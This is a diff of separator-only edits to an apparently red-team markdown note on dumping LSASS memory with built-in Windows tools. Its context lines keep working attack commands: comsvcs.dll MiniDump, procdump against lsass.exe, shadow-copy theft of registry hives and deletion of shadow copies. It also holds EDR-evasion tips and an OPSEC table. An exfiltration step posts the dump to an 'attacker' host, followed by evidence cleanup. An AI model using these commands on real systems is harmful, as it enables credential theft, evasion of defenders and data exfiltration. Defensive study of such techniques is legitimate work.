@@ -17,7 +17,7 @@ linked:
 ---
 # LSASS Dumping - Native LOLBins
 
-***
+---
 
 ## comsvcs.dll MiniDump (Native Windows)
 
@@ -39,7 +39,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %LSASS_PID% C:\temp\lsass
 :: pypykatz lsa minidump lsass.dmp
 ```
 
-___
+---
 
 ## ProcDump (Sysinternals)
 
@@ -65,7 +65,7 @@ procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
 procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp -h
 ```
 
-___
+---
 
 ## Task Manager (GUI)
 
@@ -79,7 +79,7 @@ ___
 
 **Cuando usar:** session interactive (RDP / console) en host comprometido. EDR raramente alerta sobre Task Manager dump.
 
-___
+---
 
 ## SQLDumper (Office / SQL Server)
 
@@ -91,7 +91,7 @@ ___
 
 **Por qué:** SQLDumper = Microsoft-signed minidump utility. Bypass EDR signature on procdump.exe.
 
-___
+---
 
 ## WerFault (Windows Error Reporting)
 
@@ -102,7 +102,7 @@ ___
 
 **Caveat:** WerFault output dump usually incompleto (partial). Crash semantics. Less reliable.
 
-___
+---
 
 ## ntdsutil snapshot (Edge — DCs)
 
@@ -114,7 +114,7 @@ ___
 
 **Caveat:** ntdsutil dump NTDS.dit (database), no LSASS memory directamente. Adjacent technique para hash extraction.
 
-___
+---
 
 ## VSS Snapshot (Volume Shadow Copy)
 
@@ -139,7 +139,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 vssadmin delete shadows /for=C: /quiet
 ```
 
-___
+---
 
 ## OPSEC Comparison
 
@@ -154,7 +154,7 @@ ___
 | VSS snapshot | Medium | Audit Event 5400 si SACL. |
 ^lsass-lol-comparison
 
-___
+---
 
 ## Common Errors
 
@@ -167,7 +167,7 @@ ___
 | `WerFault.exe failed` | LSASS process state | Edge case. |
 ^lsass-lol-errors
 
-___
+---
 
 ## Exfil Strategy
 
@@ -187,4 +187,4 @@ Invoke-WebRequest -Method Post -Uri http://attacker:8080/upload -InFile C:\temp\
 Remove-Item C:\temp\lsass.dmp,C:\temp\dump.zip -Force
 ```
 
-***
+---
